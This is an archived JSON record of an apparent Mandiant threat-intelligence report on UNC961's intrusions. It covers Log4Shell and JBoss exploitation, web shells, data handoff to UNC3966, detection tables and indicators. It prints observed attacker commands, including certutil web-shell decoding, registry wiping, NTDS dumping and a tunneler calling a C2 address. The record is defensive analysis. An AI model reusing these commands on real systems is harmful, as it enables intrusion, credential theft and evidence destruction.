{
    "id": "87b51bdd-e1fa-41d6-82b7-2af8dd00d907",
    "created_at": "2023-05-06T02:10:02.576521Z",
    "updated_at": "2025-03-27T02:14:05.261641Z",
    "deleted_at": null,
    "sha1_hash": "6ae8c2791bb604905b3eff540f5efb126d2a455a",
    "title": "2023-03-23 - UNC961 in the Multiverse of Mandiant- Three Encounters with a Financially Motivated Threat Actor",
    "authors": "",
    "file_creation_date": "2023-05-05T02:06:00Z",
    "file_modification_date": "2023-05-05T02:06:00Z",
    "file_size": 5357150,
    "plain_text": "# UNC961 in the Multiverse of Mandiant: Three Encounters with a Financially Motivated Threat Actor\n\n**mandiant.com/resources/blog/unc961-multiverse-financially-motivated**\n\nWeb application vulnerabilities are like doorways: you never know who or what will walk through. Between December 2021 and July 2022,\nthe [Mandiant Managed Defense and](https://www.mandiant.com/advantage/managed-defense) [Incident Response teams responded to three UNC961 intrusions at different organizations that each](https://www.mandiant.com/services/incident-response/incident-response-service)\nstarted in similar fashion. Two of these victims were under the protection of Managed Defense who identified and responded to the threat\nbefore significant impact occurred. In the third intrusion, the Mandiant Incident Response team was contacted after UNC961 had\ncompromised the victim and transferred access to UNC3966.\n\nThis blog post covers the details and timeline of each intrusion conducted by UNC961, along with detection opportunities and examples of\nhow Managed Defense’s proactive threat hunting, investigation, and response routinely limits the impact on our customers’ business and\nprevents their reality from being desecrated. Relevant MITRE ATT&CK® tactics and technique IDs are included in this blog post to indicate\nthe threat actors’ objectives at various points in the intrusions.\n\n## Attribution and Targeting\n\nAcross the multiverse of threat actors, UNC961 is financially motivated and has primarily targeted victim organizations in North America\nsince at least 2016. UNC961 is notable for quickly targeting vulnerable Internet-facing servers during periods of vulnerability and exploit\ncode disclosure. The threat group overlaps with multiple publicly reported threat clusters, including CrowdStrike's named group\n[ProphetSpider. Mandiant first publicly reported on UNC961 in our blog post, Forged in Fire: A Survey of MobileIron Log4Shell Exploitation,](https://www.mandiant.com/resources/blog/mobileiron-log4shell-exploitation)\nwhich details the threat group leveraging the Log4Shell (CVE-2021-44228) vulnerability for initial access. We believe some of the primary\nobjectives of this group are to steal sensitive data from victims and provide access to ransomware-affiliated threat clusters.\n\nUNC961 takes a cost-effective approach to accessing each victim by leveraging publicly accessible exploit code from recently disclosed\nvulnerabilities and weaponizing them for use. We have often observed UNC961 exploit popular Internet-facing application servers, including\nAtlassian Confluence (CVE-2021-26084), Citrix ADC (CVE-2019-19781), Oracle WebLogic (CVE-2020-14750), Gitlab (CVE-2021-22205)\nand others. After gaining access, UNC961 has commonly targeted and exfiltrated sensitive data, including network reconnaissance and\ncredential information that could be sold or used in support of follow-on missions. In multiple instances, UNC961 intrusion activity has\n[preceded the deployment of MAZE and](https://www.mandiant.com/resources/blog/tactics-techniques-procedures-associated-with-maze-ransomware-incidents) [EGREGOR ransomware from distinct follow-on actors.](https://www.mandiant.com/resources/blog/melting-unc2198-icedid-to-ransomware-operations)\n\n## Universe #1: I Am MobileIron Man\n\nIn our first incident, our story begins at Managed Defense. The lights are dim, and a brief message suddenly appears:\n\n\n-----\n\nFigure 1: Message captured in network egress traffic\nAt first glance, this somewhat innocuous message may disappear into the eternal din of warning messages we’ve come to expect from\nusing any piece of technology. However, to trained analysts, these few bytes egressing a network may be indicative of something more\nominous under way.\n\nRed teamers, capture-the-flag enthusiasts, and APT actors alike are probably familiar with the following command:\n\nFigure 2: TCP bash reverse shell command\nThis simple, well-documented bash TCP reverse shell is often witnessed by Mandiant as the payload for many exploits targeting UNIX-like\nhosts [MITRE ATT&CK® Technique T1059.004]. Fortunately for us, establishing an interactive shell without an established TTY will cause\nthe message bash: no job control in this shell to get sent from the victim’s host to the attacker, providing an excellent detection\nopportunity.\n\nNow that we had a host in our sights, we began expanding our scope to include events preceding and following this activity. We collected\n[local application logs around our timeframe of interest from the host and started ripgrepping for keywords (such as the destination IP](https://github.com/BurntSushi/ripgrep)\naddress) and scrutinizing log entries around our timeframe of interest. This ultimately revealed a MobileIron Core log entry that also fit the\ntimeframe of our initial bash shell detection:\n\nFigure 3: MobileIron Core log entry\nThe string in the requesterName field told us that attackers had triggered CVE-2021-44228 by submitting the exploit into the application’s\nweb portal login. Since the goal of CVE-2021-44228 is to get this \"JNDI\" exploit string written to any log that's processed by a vulnerable\ninstance of Apache, the fact that this login attempt failed is irrelevant. The exploit still gets logged, which spawned the reverse shell seen\nearlier.\n\nAttackers will commonly leverage various obfuscation techniques to increase the difficulty of detection and to stay one step ahead of\nanalysts. In this case, they substituted certain characters as nested strings. Let’s dig deeper into the exploit and payload:\n\n\n-----\n\nFigure 4: Obfuscated JNDI request\nIf we convert each nested statement into the character(s) listed at the end of each statement (after the colon and dash), we get the\nfollowing:\n\nFigure 5: Decoded JNDI request\nA quick search for “TomcatBypass” on github.com points us to the repository of a project named JNDI-Exploit. Perusing this repo’s readme\ndocument, we can see several other familiar URI patterns, giving us a better idea of the attacker’s capabilities with this tool and what each\n[logged request is attempting to do (translated readme file).](https://github-com.translate.goog/nil-malh/JNDI-Exploit/blob/main/README_OG.md?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)\n\nIn this case, the URI /TomcatBypass/Command/Base64/ simply enables an attacker to pass a Base64-encoded command to the shell.\n\nDecoding the observed Base64 command in the exploit payload yields the following:\n\nThis first part of this command unsets the bash HISTFILE variable, which prevents the operating system from logging future commands.\nNext, the command establishes the basic reverse shell which resulted in our initial detection.\n\nDespite successfully establishing a bash shell, we observed multiple similar commands issued by UNC961, suggesting that these exploits\nand payloads may have been repeatedly sent out across the Internet indiscriminately.\n\nUNC961 began their hands-on interaction with the host by issuing the ps -x command, listing all processes running under the same owner.\nRealizing that multiple bash shells were running on the host (including some from other threat actors), our actor ran the kill -9 command\nalong with numerous PIDs to end the other established shells on the host running under the Tomcat process.\n\nFollowing this, UNC961 deployed their HOLEPUNCH tunneler utility to the host. HOLEPUNCH is a Windows & UNIX source-compatible\ntunneler that uses SOCKS5 style commands wrapped in a custom outer structure to multiplex connections back to its command and control\n(C2) server.\n\nUnfortunately for UNC961, these findings assisted the customer in remediating their vulnerable MobileIron infrastructure before any further\ncompromise took place (Note: Ivanti, the parent company of MobileIron, published a permanent fix for Apache Log4j vulnerabilities in the\nFebruary 2022 release for Core 11.5.0.0).\n\n## Universe #2: Web (Shell) Slinger\n\n\n-----\n\nFigure 6: UNC961 CVE-2017-7504 compromise timeline\nIn our second incident, Managed Defense spotted UNC961 sticking with the theme of web application attacks when the threat actor\nexploited a JBoss MQ Java Message Service (JMS) Deserialization vulnerability (CVE-2017-7504) on a customer’s Internet-exposed server\n\n[T1190]. The earliest evidence of compromise occurred when the threat actor generated an HTTP POST request to the URI /jbossmq_httpil/HTTPServerILServlet, which coincided with the execution of the command cmd.exe /c \"dir > k.txt\" by the java.exe process._\n\nThree minutes later, the java.exe process executed a command to write a Base64-encoded PHP web shell to the server [T1505.003]. Next,\nthe java.exe process executed a certutil command to decode the contents of the Base64-encoded web shell file k.txt to a web accessible\nfile k.jspx [T1140].\n\n\n-----\n\nFigure 7: Java process used to create an encoded web shell\n\nParent: C:\\Java\\bin\\java.exe\n\nProcess: C:\\Windows\\System32\\cmd.exe\n\nCommands:\n\ncmd.exe /c \"echo <2,212 Base64 characters> > k.txt\"\ncmd.exe /c \"certutil -f -decode ..\\server\\default\\deploy\\jms\\jbossmq-httpil.sar\\jbossmq-httpil.war\\k.txt\n..\\server\\default\\deploy\\jms\\jbossmq-httpil.sar\\jbossmq-httpil.war\\k.jspx\"\n\nUNC961 then deployed a second web shell that Mandiant identified as a JSP-based web shell generated by the BLUEBEAM web shell\nframework [T1505.003]. BLUEBEAM (aka. Godzilla) is a publicly available web shell management tool written in JAVA that can generate\nweb shell payloads in JSP, ASP.NET, and PHP. Mandiant has also observed BLUEBEAM web shell deployment following the exploitation of\nProxyShell vulnerabilities on Microsoft Exchange Servers.\n\nFigure 8: BLUEBEAM.JSP web shell\n\nPath: C:\\<path>\\jboss-4.2.3.GA\\server\\default\\deploy\\jms\\jbossmq-httpil.sar\\jbossmq-httpil.war\n\nFile Name: httpil.jsp\n\nOne month later, UNC961 came back to the httpil.jsp web shell and started to execute internal discovery commands that manifested as\nchild processes under the parent process java.exe. Examples of UNC961 discovery commands include using the ping utility to test network\nconnections [T1018], the net utility to enumerate permission groups [T1069.001, T1069.002], the ipconfig utility to view local network\nconfiguration [T1016], the quser utility to view currently logged on users [T1033], and the dir command to view user account paths [T1083]\n(Figure 9). UNC961 performed nslookup commands for the domain and subdomains of intensive[.]int and pinged the IP address\n_119.9.3[.]198. This domain and IP address are associated with Rackspace DNS servers, which may indicate network connectivity testing._\n\nFigure 9: Commands executed through the web shell\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&quser\" 2>&1\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&ipconfig /all\" 2>&1\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&slookup intensive[.]int\" 2>&1\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&nslookup intensive[.]int\" 2>&1\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&nslookup ord.intensive[.]int\" 2>&1\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&nslookup syd.intensive[.]int\" 2>&1\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&ping -n 1 119.9.3[.]198\" 2>&1\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&dir c:\\users\" 2>&1\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&net user\" 2>&1\n\ncmd /c \"cd /d \"C:/<path>/jboss-4.2.3.GA/bin/\"&nslookup <admin account> /domain\" 2>&1\n\nManaged Defense’s threat hunting team identified the web shell executed commands using multi-event correlation that matched event\nsequences tagged under the MITRE ATT&CK® Persistence and Discovery tactics. In this case, UNC961 used their web shell [Persistence]\nto launch commands on the victim server that collected local network information [Discovery]. Mandiant uses multi-event correlation\n[techniques, such as sequencing and clustering, for low signal events that, when combined, can identify threat actor behaviors. The](https://www.mandiant.com/resources/blog/china-nexus-espionage-southeast-asia)\ncustomer isolated the server, and the threat actor was eradicated from the environment before they could conduct further actions on their\nobjectives.\n\n## Universe #3: Every Morning, The Same Nightmare\n\nIn our final incident, an organization first identified evidence of compromise when they detected a ransom note file HOW_DECRYPT.TXT\nrelated to CryptoDefense ransomware written to a file server 131 days after UNC961 gained initial access to their environment. Mandiant’s\nIncident Response team was called in at that point to investigate and assist with evicting the threat actors from the customer’s environment.\n\n\n-----\n\nDuring the investigation, Mandiant identified evidence of an access hand off at day 63 between UNC961 and another threat actor Mandiant\nrefers to as UNC3966, prior to data collection and exfiltration. UNC3966 collected data and performed exfiltration; however, despite a\nransom note referencing CryptoDefense, the threat actor didn’t appear to run an encryptor.\n\nFigure 10: Initial UNC961 access with HOLERUN AND MUTEPUT deployment\nUNC961 gained an initial foothold on a compromised Windows 2008 server and deployed HOLERUN and MUTEPUT malware as a\nWindows Service [T1543.003] before going relatively dormant for two months. HOLERUN is a Windows utility written in C that functions\nsimilar to Runas that can be used to create processes and run commands under specified users with corresponding privileges. MUTEPUT\nis a backdoor that supports file download, file upload, and arbitrary command execution. During the period of low activity, UNC961 used the\nWGET utility to download additional malware and tools [T1105], including the PSCP file transfer utility, 7-Zip file archiver, the TxPortMap\nport scanner, and a SOCKS proxy utility.\n\n\n-----\n\nAround two months after the initial compromise, there was an access hand off event between UNC961 and UNC3966. Mandiant identified a\nHOLERUN utility installation by UNC961 followed by the deployment of the BARNWORK backdoor for UNC3966 approximately 26 minutes\nlater. BARNWORK is a backdoor written in C++ that communicates using a custom binary protocol.\n\nFigure 11: Handoff between UNC961 and UNC3966\nAfter receiving access, UNC3966 moved laterally through the environment over Remote Desktop Protocol (RDP) [T1021.001] using a\ncompromised domain administrator account [T1078.002] and installed the BARNWORK backdoor and LIGHTBUNNY tunneler malware as\nScheduled Tasks [T1053.005]. LIGHTBUNNY is a client component of a tunneler written in C that wraps a custom protocol over SOCKS.\nUNC3966 also used Windows Background Intelligent Transfer Service (BITS) jobs [T1197] to download additional payloads hosted on their\ninfrastructure [T1105].\n\n\n-----\n\nFigure 12: LIGHTBUNNY deployment and BITS download jobs\nUNC3966 performed internal host discovery [T1018] using the ping and nslookup utilities and collected system information [T1082] using\nthe Windows Management Instrumentation Command-line utility wmic.exe [T1047]. To cover their tracks, UNC3966 ran multiple reg.exe\ncommands to delete Registry keys containing information related to file searching, terminal services remote desktop activity, and application\nlaunch activity [T1112, T1070.007].\n\n\n-----\n\nFigure 13: Indicator removal and discovery commands\nInterestingly, UNC961 reappeared post-handoff on day 116 to install a TURNSIGN tunneler on a new system. TURNSIGN is a tunneler that\nestablishes a simple SOCKS5 server and creates an encrypted tunnel between the sample and a hard-coded C2.\n\n\n-----\n\nFigure 14: UNC961 deployment of TURNSIGN\nUNC3966 used the 7-zip archive utility to compress data related to Contracts and Accounting information that was stored on a network\nattached storage (NAS) device [T1560.001] and transferred the data over SSH protocol [T1048] to threat actor-controlled IP addresses\nusing the WinSCP utility.\n\n\n-----\n\nFigure 15: 7-zip file archival and exfiltration via WinSCP\nOn day 143, twelve days after the exfiltration activity, UNC3966 returned to the environment and executed a series of discovery commands\nto collect information related to the system, users, permission groups, and domain trusts [T1069.002, T1482, T1082, T1033]. UNC3966\n[downloaded additional tools from the file sharing website file[.]io to a domain controller, including a version of the Invoke-ShareFinder](https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1)\nPowerShell script that was used to enumerate network shares.\n\n\n-----\n\nFigure 16: UNC3966 discovery commands and ShareFinder usage\nTo harvest additional account credentials, UNC3966 used the Task Manager application to dump LSASS memory on multiple systems\n\n[T1003.001] and uploaded the dump files to the file sharing website dropmefiles[.]com [T1567]. The threat actor also created a new domain\nuser account [T1136.002] and added it to the Domain Admins permissions group [T1098] to have an independent account for privileged\ncommand execution and expanded access to the environment.\n\n\n-----\n\nFigure 17: LSASS process dump and new domain admin account creation\nTo perform additional network reconnaissance, UNC3966 leveraged the ADFind utility to collect Active Directory information [T1016, T1018,\nT1069.002, T1482, T1087.002]. Mandiant identified evidence of credential access activities leveraging Mimikatz DCSync [T1003.006] and\nthe Windows Active Directory utility Ntdsutil to dump the Active Directory database ntds.dit [T1003.003] and the SYSTEM and SECURITY\nregistry hives on a domain controller.\n\n\n-----\n\nFigure 18: ADFind execution and NTDS Active Directory dump\nMandiant worked with the customer to harden the environment and limit the impact of a potential ransomware deployment. The customer\nresponded swiftly enough to prevent ransomware encryption in the environment, but the extent of the compromise necessitated a lengthy\nremediation process, including rebuilding infected systems, scoping sensitive data access and lateral movement by the threat actor during\ntheir months of access, and coordinating and performing an enterprise-wide password reset. During the eradication period, Mandiant\nhelped the customer prepare responses for possible extortion or ransom scenarios. UNC961 and UNC3966’s access was revoked and the\ncustomer finally put this nightmare to rest.\n\n## Outlook and Implications\n\n\n-----\n\nIn a multiverse full of threat actors, UNC961 is resourceful in their opportunistic angle to initial access operations. The threat group employs\na cost-effective approach to achieve initial access by exploiting recently disclosed vulnerabilities using publicly available exploit code. This\ndiffers from other common initial intrusion vectors, such as phishing, and is indiscriminate by nature, which can provide UNC961 with\nnumerous successful intrusions.\n\nAny organization can find themselves targeted by threat actors like UNC961 but can count on Mandiant’s Managed Detection & Response\n[(MDR) and threat hunting services for protection. Proactive discovery of external assets using Attack Surface Management can also help](https://www.mandiant.com/advantage/attack-surface-management)\nidentify vulnerabilities, misconfigurations, and other exposures that could provide a doorway to threat actors.\n\n## Detection Opportunities\n\n\n**Detection**\n**Opportunity**\n\nWeb server\nprocess echo\nBase64encoded string\n\nWeb server\nprocess\nlaunching\ndiscovery\ncommands\n\nWeb shell\ndeployment\nusing certutil to\ndecode payload\n\nMessage\ngenerated\nacross network\ntraffic when\nestablishing an\ninteractive shell\nwithout an\nestablished\nTTY\n\n\n**MITRE**\n**ATT&CK®**\n**Technique**\n\n\n**Event Details**\n\n\nT1505.003 Parent Process: java.exe\n\nCommand(s):\n\n_cmd.exe /c \"echo <2,212 Base64 characters> > k.txt\"_\n\n\nT1505.003,\nT1083,\nT1018,\nT1069.001,\nT1069.002,\nT1016,\nT1033,\nT1049\n\nT1505.003,\nT1140\n\n\nParent Process: java.exe\n\nCommand(s):\n\n_cmd.exe /c \"dir > k.txt\"_\n_quser 2>&1_\n_ipconfig /all 2>&1_\n_nslookup intensive[.]int 2>&1_\n_nslookup ord.intensive[.]int 2>&1_\n_nslookup syd.intensive[.]int 2>&1_\n_ping -n 1 119.9.3[.]198 2>&1_\n_dir c:\\users 2>&1_\n_net user 2>&1_\n_nslookup <admin account> /domain 2>&1_\n\nParent Process: java.exe\n\nCommands:\n\n_cmd.exe /c \"certutil -f -decode ..\\server\\default\\deploy\\jms\\jbossmq-httpil.sar\\jbossmq-httpil.war\\k.txt_\n_..\\server\\default\\deploy\\jms\\jbossmq-httpil.sar\\jbossmq-httpil.war\\k.jspx\"_\n\n\nT1059.004 String: bash: no job control in this shell\n\n\n-----\n\nSuspicious\nWindows\nService\ncreation events\n\nSuspicious\nWindows\nScheduled Task\ncreation events\n\nSuspicious\nBITS transfer\njobs\n\nSuspicious\nWGET file\ndownload\nactivity\n\nIndicator\nremoval from\nWindows\nRegistry\n\n\nT1543.003 HOLERUN Service Name: wmhost\n\nPath: C:\\Windows\\wmhost.exe\n\nMUTEPUT Service Name: WindowsNTApp\n\nPath: C:\\Windows\\System32\\winnta.exe\n\nTURNSIGN Service Name: WmiPrv\n\nPath: C:\\Windows\\System32\\WmiPrv.exe\n\n-\nProcess: sc.exe\n\nCommand Line Example:\n\n_sc create WmiPrv start= auto displayname= 'WmiPrv' binpath= 'C:\\Windows\\System32\\WmiPrv.exe'_\n\nT1053.005 LIGHTBUNNY Task Name: MKSAuth\n\nProgram Path: C:\\Users\\Administrator\\AppData\\Local\\Temp\\vmtoolsd.exe\n\nLIGHTBUNNY Task Name: MKS Update _Tools_\n\nProgram Path: C:\\MKS\\mksnt\\mks.exe\n\nBARNWORK Task Name: MKSAuth\n\nProgram Path: C:\\Windows\\System32\\mksauth.exe\n\n\nT1105,\nT1197\n\n\nLog: Microsoft-Windows-Bits-Client/Operational\n\nEID: 59\n\nMessages:\n\n_BITS started the myjob transfer job that is associated with the https[:]//ms-prod19-_\n_live[.]com/rehjhj8785780923853/abc URL._\n_BITS started the myjob transfer job that is associated with the https[:]//ms-prod19-_\n_live[.]com/rehjhj8785780923853/cdef URL._\n\n\nT1105 User-Agent: Wget/1.11.4\n\nURLs:\n\n_/7z.bin_\n_/pscp.bin_\n_/333.bmp_\n_/333.bpm_\n_/auditd64.bin_\n_/TxPortMap.bin_\n\n\nT1112,\nT1070.007\n\n\nProcess: reg.exe\n\nCommand Line:\n\n_reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f_\n_reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f_\n_reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\"_\n_attrib C:\\Users\\TEMP\\documents\\Default.rdp -s -h_\n_reg delete_\n_\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths\"_\n_/va /f_\n_reg delete_\n_\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery\"_\n_/va /f_\n_reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f_\n\n\n-----\n\nSystem\ninformation\ncollection using\nthe Windows\nManagement\nInstrumentation\nCommand-line\nutility wmic.exe\n\nExecution and\nremoval of\nPsExec Service\n\n7-zip execution\nto create\narchive with\nremote share or\nkeywords of\ninterest on\ncommand line\n\nSpike (> 1GB)\nin outbound\nSSH byte\ntransfer activity\nto remote IP\naddresses\n\nExecution of\nPowerShell by\nBARNWORK\nbackdoor\n\n\nT1047 Command Line examples:\n\n_wmic /node:\"10.0.0.1\" logicaldisk get deviceid,drivetype,filesystem,freespace,size,volumename_\n_wmic /node:\"10.0.0.2\" logicaldisk get deviceid,drivetype,filesystem,freespace,size,volumename_\n_…_\n_wmic /node:\"10.0.0.72\" logicaldisk get deviceid,drivetype,filesystem,freespace,size,volumename_\n\n\nT1059.001 Parent Process: C:\\MKS\\bin\\mks.exe\n\nProcess: powershell.exe\n\nCommand Line:\n\n_\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Set-ExecutionPolicy_\n_RemoteSigned -Scope Process -Force -Confirm:$false;$PSDefaultParameterValues = @{'Out-_\n_File:Encoding' = 'utf8'}; \" C:\\Windows\\TEMP\\CWwaKhefO.ps1\" | Out-File -encoding UTF8_\n_\"C:\\Windows\\TEMP\\\\bAbiTGhY.txt\"_\n\n\nT1569.002,\nT1070,\nT1543.003\n\n\nLog: System\n\nEID: 7045\n\nMessage:\n\n_A service was installed in the system._\n\n_Service Name: PSEXESVC_\n\n_Service File Name: %SystemRoot%\\PSEXESVC.exe_\n\n_Service Type: user mode service_\n\n_Service Start Type: demand start_\n\n_Service Account: LocalSystem_\n\n-\nParent Process: C:\\Windows\\System32\\cmd.exe\n\nProcess: C:\\MKS\\bin\\PsExec.exe\n\nCommand Line:\n\n_psexec -s cmd_\n\n-\nProcess: sc.exe\n\nCommand Line:\n\n_sc delete psexesvc_\n\n\nT1560.001 Command Line Examples:\n\n_<path>\\7zG.exe\" a -i#7zMap5172:94:7zEvent7590 -ad -saa --_\n_\"\\\\10.0.0.1\\nasdevice\\Path\\Accounting\"_\n_”<path>\\tmp\\7\\App\\7-Zip64\\7zG.exe\" a -i#7zMap21824:98:7zEvent2463 -ad -saa --_\n_\"\\\\10.0.0.1\\nasdevice\\Path\\Contracts\"_\n\n\nT1048,\nT1071.002,\nT1021.004\n\n\nWinSCP connections to 104.149.170[.]183:22 and 23.227.203[.]214:22\n\n\n-----\n\nLIGHTBUNNY\nexecution by\nWindows\nCommand\nShell\n\nShareFinder\nPowerShell\nscript execution\nand Script\nBlock Logging\nkeywords\n\nLSASS process\nmemory\ndumped by\nTask Manager\n\nCommand to\nlaunch\nPowerShell\nfrom a specific\ndirectory\n\nADFind\nreconnaissance\n\nSuspicious\nntdsutil.exe\nexecution and\nfile writes\n\n\nT1059.003,\nT1572\n\nT1059.001,\nT1135\n\n\nT1003.003 Process: ntdsutil.exe\n\nFiles Created:\n\n_C:\\temp\\Active Directory\\ntds.dit_\n_C:\\Users\\<user>\\AppData\\Local\\Temp\\tmp.edb_\n_C:\\temp\\registry\\SECURITY_\n_C:\\temp\\registry\\SYSTEM_\n\n\nParent Process: C:\\Windows\\System32\\cmd.exe\n\nProcess: C:\\Users\\Administrator\\AppData\\Local\\Temp\\vmtools.exe\n\nCommand Line:\n\n_\"C:\\Windows\\system32\\cmd.exe\" /c \"C:\\Users\\Administrator\\AppData\\Local\\Temp\\vmtools.exe_\n_37.1.209[.]20 443\"_\n\nFile Name: SF.ps1\n\nOutput File Names:\n\n_sh.txt_\n_shda.txt_\n\n-\nLog: Microsoft-Windows-PowerShell/Operational\n\nEID: 4104\n\nMessage example:\n\n_#requires -version 2_\n\n_[Implementation of Sharefinder that utilizes https://github.com/mattifestation/psreflect to stay off of disk.](https://github.com/mattifestation/psreflect)_\n\n_By @harmj0y_\n\nMessage Keyword Examples:\n\n_Sharefinder_\n_New-InMemoryModule_\n_mattifestation_\n_harmj0y_\n_Invoke-ShareFinder_\n\n\nT1003.001 Process: C:\\Windows\\System32\\Taskmgr.exe\n\nFile Write:\n\n_C:\\Users\\<user>\\AppData\\Local\\Temp\\lsass.DMP_\n\nT1059.001 Process Command Line:\n\n_PowerShell.exe -noexit -command Set-Location -literalPath 'C:\\ProgramData'_\n\n\nT1016,\nT1018,\nT1069.002,\nT1482,\nT1087.002\n\n\nCommand Line Examples:\n\n_C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\<user>\\Downloads\\ADfind\\backup.bat\" ”_\n_adfind.exe -f \"(objectcategory=group)\"_\n_adfind.exe -f \"(objectcategory=organizationalUnit)\"_\n_adfind.exe -f \"(objectcategory=person)\"_\n_adfind.exe -f \"objectcategory=computer\"_\n_adfind.exe -gcb -sc trustdmp_\n_adfind.exe -sc trustdmp_\n_adfind.exe -subnets -f (objectCategory=subnet)_\n\n\n## Indicators of Compromise\n\n\n-----\n\n**Type** **Value** **Attribution** **Description**\n\nMD5 c55f4b123c645f9c5a1d00205ab2e61e UNC3966 LIGHTBUNNY tunneler\n\nMD5 31c49b87463f4e4ce6ae4c442319d3a2 UNC961 HOLERUN\n\nIP 104.149.170[.]183 UNC3966 WinSCP\n\nIP 23.227.203[.]214 UNC3966 WinSCP\n\nIP 37.1.209[.]20 UNC3966 Command and Control\n\nIP 107.181.187[.]184 UNC961 Command and Control\n\nIP 45.61.136[.]39 UNC961 Command and Control\n\nIP 209.141.61[.]225 UNC961 Command and Control\n\nIP 107.181.187[.]182 UNC961 Command and Control\n\nIP 136.244.69[.]29 UNC961 Exploitation\n\nIP 5.149.250[.]214 UNC961 Web shell Interaction\n\nURL https[:]//ms-prod19-live[.]com/rehjhj8785780923853/abc UNC3966 Download\n\nURL https[:]//ms-prod19-live[.]com/rehjhj8785780923853/cdef UNC3966 Download\n\n## Mandiant Security Validation Actions\n\nOrganizations can validate their security controls using the following actions with Mandiant Security Validation.\n\n**VID** **Name**\n\nA100-299 Active Directory - ADFIND.EXE, Enumeration\n\nA105-181 Host CLI - Secret Dumps with Ntdsutil\n\nA100-879 Malicious File Transfer - ADFIND.EXE, Download\n\nA101-172 Active Directory - ADFIND.EXE, User Query\n\nA101-170 Active Directory - ADFIND.EXE, Organizational Units Query\n\nA101-168 Active Directory - ADFIND.EXE, Domain Trust Query\n\nA101-167 Active Directory - ADFIND.EXE, Computer Query\n\nA101-169 Active Directory - ADFIND.EXE, Group Query\n\nA106-034 Host CLI - POWERVIEW, ShareFinder, Execution, Variant#1\n\nA106-033 Application Vulnerability - UNC961, CVE-2021-44228, HTTP GET, LDAP Callback via URI Path\n\n\n-----\n\nA106-030 Malicious File Transfer - UNC961, TURNSIGN, Download, Variant #1\n\nA106-029 Malicious File Transfer - UNC961, MUTEPUT, Download, Variant #1\n\nA106-028 Malicious File Transfer - UNC961, BLUEBEAM.JSP, Download, Variant #1\n\nA106-027 Application Vulnernability - CVE-2017-7504, Exploitation\n\nA106-026 Protected Theater - UNC3966, LIGHTBUNNY, Execution, Variant #1\n\nA106-025 Malicious File Transfer - UNC3966, LIGHTBUNNY, Download, Variant #1\n\nA106-024 Malicious File Transfer - UNC961, HOLERUN, Download, Variant #1\n\nA106-023 Command and Control - Bash Non Interactive Reverse Shell\n\nA105-179 Host CLI - MIMIKATZ (2.2.0), DCSync, Variant #1\n\n## Acknowledgements\n\nA big ‘thank you 3000’ to Tim Martin, threat hunting lead for Managed Defense, for collaborating on the initial idea and contributing technical\nand comical insights. Special thanks to Tommy Dacanay and Foti Castelan for their marvelous technical review and information sharing that\nhelped shape the multiverse. A cosmic high-five to the FLARE analysts who analyzed UNC961 and UNC3966 payloads referenced in this\nblog post: Matt Williams, Muhammad Umair, Jay Smith, and Josh Homan. And a tip of the helmet to Matthew Hoerger for assembling\nMandiant Security Validation (MSV) Actions and Ana Foreman for the graphics.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-23 - UNC961 in the Multiverse of Mandiant- Three Encounters with a Financially Motivated Threat Actor.pdf"
    ],
    "report_names": [
        "2023-03-23 - UNC961 in the Multiverse of Mandiant- Three Encounters with a Financially Motivated Threat Actor.pdf"
    ],
    "threat_actors": [
        {
            "id": "c3c864b3-fac9-4d56-8500-7c06c829fbf8",
            "created_at": "2023-01-06T13:46:39.071873Z",
            "updated_at": "2025-03-27T02:00:02.990045Z",
            "deleted_at": null,
            "main_name": "TA2101",
            "aliases": [
                "Storm-0216",
                "DEV-0216",
                "UNC2198",
                "Maze Team",
                "TWISTED SPIDER",
                "GOLD VILLAGE"
            ],
            "source_name": "MISPGALAXY:TA2101",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "056826cb-6e17-4954-a9b4-2cc8c6ae3cb8",
            "created_at": "2023-03-04T02:01:54.115678Z",
            "updated_at": "2025-03-27T02:00:03.125249Z",
            "deleted_at": null,
            "main_name": "Prophet Spider",
            "aliases": [
                "GOLD MELODY",
                "UNC961"
            ],
            "source_name": "MISPGALAXY:Prophet Spider",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "47b52642-e5b8-4502-b714-b625002d86aa",
            "created_at": "2024-06-19T02:03:08.086579Z",
            "updated_at": "2025-03-27T02:05:17.385492Z",
            "deleted_at": null,
            "main_name": "GOLD MELODY",
            "aliases": [
                "UNC961",
                "PROPHET SPIDER"
            ],
            "source_name": "Secureworks:GOLD MELODY",
            "tools": [
                " 7-ZIP",
                " AUDITUNNEL",
                " BURP Suite",
                " GOTROJ",
                " JSP webshells",
                " Mimikatz",
                " Wget",
